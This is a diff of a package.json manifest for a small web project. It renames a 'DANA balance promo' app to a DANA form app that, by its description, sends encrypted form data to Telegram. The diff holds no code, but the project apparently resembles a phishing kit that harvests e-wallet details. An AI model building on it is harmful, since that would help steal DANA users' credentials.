@@ -1,15 +1,12 @@
 {
-  "name": "dana-promo-app",
+  "name": "dana-form-app",
   "version": "1.0.0",
-  "description": "Aplikasi promo saldo DANA",
-  "scripts": {
-    "dev": "vercel dev",
-    "start": "serve public/"
-  },
+  "description": "Form aplikasi DANA dengan enkripsi data ke Telegram",
+  "main": "index.html",
   "dependencies": {
     "axios": "^1.6.0"
   },
-  "devDependencies": {
-    "serve": "^14.2.0"
-  }
+  "keywords": ["dana", "form", "telegram", "encryption"],
+  "author": "",
+  "license": "MIT"
 }
